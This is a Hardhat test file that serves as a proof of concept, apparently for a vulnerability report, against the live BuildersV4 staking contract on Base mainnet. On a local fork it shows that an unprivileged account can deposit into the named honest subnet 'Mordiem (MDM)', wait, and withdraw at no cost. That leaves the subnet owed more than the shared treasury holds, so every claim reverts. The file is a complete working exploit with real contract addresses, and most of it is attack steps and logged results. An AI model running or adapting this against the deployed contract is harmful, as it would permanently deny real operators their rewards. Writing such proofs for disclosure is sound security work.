/**
 * Builders protocol, Base mainnet.
 *
 * BuildersV4.claim() pays a subnet's whole `pendingRewards` in one transfer from
 * the shared BuildersTreasuryV2 balance. There is no partial-claim path and no
 * cap at the treasury balance, and `pendingRewards` is credited from the
 * emission curve without reference to what the treasury actually holds.
 *
 * BuildersV4.deposit() lets ANY address deposit into ANY existing subnet, which
 * raises that subnet's share of the emission. A third party can therefore drive
 * an honest subnet's `pendingRewards` above the treasury balance, after which
 * claim() reverts on the transfer and the subnet can collect nothing at all,
 * not even the part the treasury could cover.
 *
 * The attacker is a fresh EOA. It never administers the victim subnet, never
 * impersonates anyone, and recovers its entire deposit, so the attack costs
 * gas only. The honest admin is impersonated ONLY to show what it loses.
 *
 * Run: npx hardhat test
 */
const { expect } = require("chai");
const { ethers, network } = require("hardhat");
const { deal } = require("../helpers/deal");

// ---- Appendix A addresses, Base mainnet -----------------------------------
const BUILDERS_V4 = "0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9";
const TREASURY_V2 = "0x9eba628581896ce086cb8f1A513ea6097A8FC561";
const MOR = "0x7431aDa8a591C955a994a21710752EF9b882b8e3";

const MOR_USD = 0.6988; // DefiLlama / CoinGecko spot at the time of writing

// The honest subnet under attack. Its admin is an independent address that
// stays honest throughout and is never used to perform any attacker action.
const VICTIM_SUBNET_NAME = "Mordiem (MDM)";

// Capital the attacker parks in the victim's subnet. Base MOR total supply at
// the pinned block is about 6.37M, so this is an ordinary, obtainable size.
const ATTACKER_DEPOSIT = ethers.parseEther("1000000");

const HORIZON_DAYS = 60;

const b4Abi = [
  "function deposit(bytes32,uint256) external",
  "function withdraw(bytes32,uint256) external",
  "function claim(bytes32,address) external",
  "function getSubnetId(string) view returns (bytes32)",
  "function subnets(bytes32) view returns (string name,address admin,uint128 u1,uint128 withdrawLockPeriodAfterDeposit,uint128 u2,uint256 minimalDeposit,address claimAdmin)",
  "function subnetsData(bytes32) view returns (uint128 u1,uint256 deposited,uint256 u2,uint256 rate,uint256 pendingRewards)",
  "function usersData(address,bytes32) view returns (uint128 lastDeposit,uint128 u1,uint256 deposited,uint256 u2)",
  "function getCurrentSubnetRewards(bytes32) view returns (uint256)",
  "function getCurrentSubnetsRewards() view returns (uint256)",
  "function allSubnetsData() view returns (uint256 u1,uint256 rate,uint256 totalDeposited,uint256 u2)",
  "function allSubnetsDataV4() view returns (uint256 distributedRewards,uint256 undistributedRewards,uint256 claimedRewards,uint128 lastUpdate)",
  "function owner() view returns (address)",
];
const morAbi = [
  "function approve(address,uint256) returns (bool)",
  "function balanceOf(address) view returns (uint256)",
];

const f = (x) => Number(ethers.formatEther(x)).toLocaleString("en-US", { maximumFractionDigits: 2 });
const usd = (x) => "$" + (Number(ethers.formatEther(x)) * MOR_USD).toLocaleString("en-US", { maximumFractionDigits: 0 });
const warp = async (s) => { await network.provider.send("evm_increaseTime", [s]); await network.provider.send("evm_mine"); };
const snap = () => network.provider.send("evm_snapshot");
const back = (i) => network.provider.send("evm_revert", [i]);

describe("BuildersV4: an unprivileged deposit permanently denies an honest subnet its rewards", function () {
  let attacker, b4, mor, subnetId, honestAdmin, adminSigner, treasuryBalance, forkBlock;

  before(async function () {
    await network.provider.send("evm_mine");
    forkBlock = await ethers.provider.getBlockNumber();
    [attacker] = await ethers.getSigners();
    b4 = new ethers.Contract(BUILDERS_V4, b4Abi, attacker);
    mor = new ethers.Contract(MOR, morAbi, attacker);

    subnetId = await b4.getSubnetId(VICTIM_SUBNET_NAME);
    const s = await b4.subnets(subnetId);
    honestAdmin = s[1];
    treasuryBalance = await mor.balanceOf(TREASURY_V2);

    // The honest admin is impersonated only so the test can show what it loses.
    // No attacker action is ever performed from this account.
    await network.provider.send("hardhat_impersonateAccount", [honestAdmin]);
    await network.provider.send("hardhat_setBalance", [honestAdmin, "0x56BC75E2D63100000"]);
    adminSigner = await ethers.getSigner(honestAdmin);

    console.log(`\n  Base mainnet fork, block ${forkBlock}`);
    console.log(`  BuildersV4         ${BUILDERS_V4}  | owner ${await b4.owner()}`);
    console.log(`  BuildersTreasuryV2 ${TREASURY_V2}  | holds ${f(treasuryBalance)} MOR`);
    console.log(`  victim subnet      "${s[0]}"  ${subnetId}`);
    console.log(`    honest admin     ${honestAdmin}  (stays honest, never acts as the attacker)`);
    console.log(`    subnet deposits  ${f((await b4.subnetsData(subnetId))[1])} MOR`);
    console.log(`  attacker           ${attacker.address}  (fresh EOA, no role of any kind)`);
  });

  it("1. the treasury is shared and finite, and the protocol already credits more than it holds", async function () {
    const owedAll = await b4.getCurrentSubnetsRewards();
    console.log(`\n  outstanding credited to all subnets = ${f(owedAll)} MOR`);
    console.log(`  BuildersTreasuryV2 balance          = ${f(treasuryBalance)} MOR`);
    console.log(`  shortfall                           = ${f(owedAll - treasuryBalance)} MOR`);
    expect(owedAll).to.be.gt(treasuryBalance);
  });

  it("2. CONTROL: with no attacker, the honest admin collects its rewards after 60 days", async function () {
    const id = await snap();
    await warp(HORIZON_DAYS * 86400);
    const owed = await b4.getCurrentSubnetRewards(subnetId);
    const before = await mor.balanceOf(honestAdmin);
    await b4.connect(adminSigner).claim(subnetId, honestAdmin);
    const paid = (await mor.balanceOf(honestAdmin)) - before;
    console.log(`\n  owed after ${HORIZON_DAYS} days = ${f(owed)} MOR`);
    console.log(`  claim PAID            = ${f(paid)} MOR  (${usd(paid)})`);
    expect(paid).to.be.gt(0n);
    this.controlPaid = paid;
    await back(id);
  });

  it("3. ATTACK: one unprivileged deposit over the same 60 days leaves the admin with nothing", async function () {
    const id = await snap();

    await deal(MOR, attacker.address, ATTACKER_DEPOSIT);
    await mor.approve(BUILDERS_V4, ethers.MaxUint256);
    const attackerStart = await mor.balanceOf(attacker.address);

    // The attacker deposits into a subnet it does not administer. No approval,
    // consent or action by the subnet admin is involved.
    await b4.deposit(subnetId, ATTACKER_DEPOSIT);
    console.log(`\n  attacker deposited ${f(ATTACKER_DEPOSIT)} MOR into a subnet it does not administer`);

    await warp(HORIZON_DAYS * 86400);

    // The attacker takes its entire capital back before the harm is measured.
    await b4.withdraw(subnetId, ethers.MaxUint256);
    const attackerEnd = await mor.balanceOf(attacker.address);
    console.log(`  attacker withdrew everything: ${f(attackerStart)} -> ${f(attackerEnd)} MOR, net cost ${f(attackerStart - attackerEnd)} MOR`);
    expect(attackerEnd).to.equal(attackerStart);
    expect((await b4.usersData(attacker.address, subnetId))[2]).to.equal(0n);

    const owed = await b4.getCurrentSubnetRewards(subnetId);
    const treasuryNow = await mor.balanceOf(TREASURY_V2);
    console.log(`  subnet now owed ${f(owed)} MOR against a treasury holding ${f(treasuryNow)} MOR`);
    expect(owed).to.be.gt(treasuryNow);

    await expect(b4.connect(adminSigner).claim(subnetId, honestAdmin))
      .to.be.revertedWith("ERC20: transfer amount exceeds balance");
    console.log(`  honest admin claim -> REVERT 'ERC20: transfer amount exceeds balance'`);
    console.log(`  the ${f(treasuryNow)} MOR in the treasury stays untouchable: claim() has no partial path`);

    await back(id);
  });

  it("4. the denial is permanent: the owed figure only grows, so claim never recovers", async function () {
    const id = await snap();
    await deal(MOR, attacker.address, ATTACKER_DEPOSIT);
    await mor.approve(BUILDERS_V4, ethers.MaxUint256);
    await b4.deposit(subnetId, ATTACKER_DEPOSIT);
    await warp(HORIZON_DAYS * 86400);
    await b4.withdraw(subnetId, ethers.MaxUint256);

    console.log("");
    for (const d of [30, 180, 365]) {
      await warp(d * 86400);
      let denied = false;
      try { await b4.connect(adminSigner).claim.staticCall(subnetId, honestAdmin); } catch (e) { denied = true; }
      const owed = await b4.getCurrentSubnetRewards(subnetId);
      console.log(`  +${String(d).padStart(3)} further days -> claim ${denied ? "still REVERTS" : "succeeds"}   owed ${f(owed)} MOR`);
      expect(denied).to.equal(true);
    }
    await back(id);
  });

  it("5. quantified loss to the honest subnet", async function () {
    const id = await snap();
    await warp(HORIZON_DAYS * 86400);
    const before = await mor.balanceOf(honestAdmin);
    await b4.connect(adminSigner).claim(subnetId, honestAdmin);
    const controlPaid = (await mor.balanceOf(honestAdmin)) - before;
    await back(id);

    console.log(`\n  honest admin collects with no attacker : ${f(controlPaid)} MOR  (${usd(controlPaid)})`);
    console.log(`  honest admin collects after the attack : 0 MOR`);
    console.log(`  attacker net cost                      : 0 MOR (gas only)`);
    console.log(`  treasury left stranded                 : ${f(treasuryBalance)} MOR (${usd(treasuryBalance)})`);
    expect(controlPaid).to.be.gt(ethers.parseEther("1000"));
  });
});
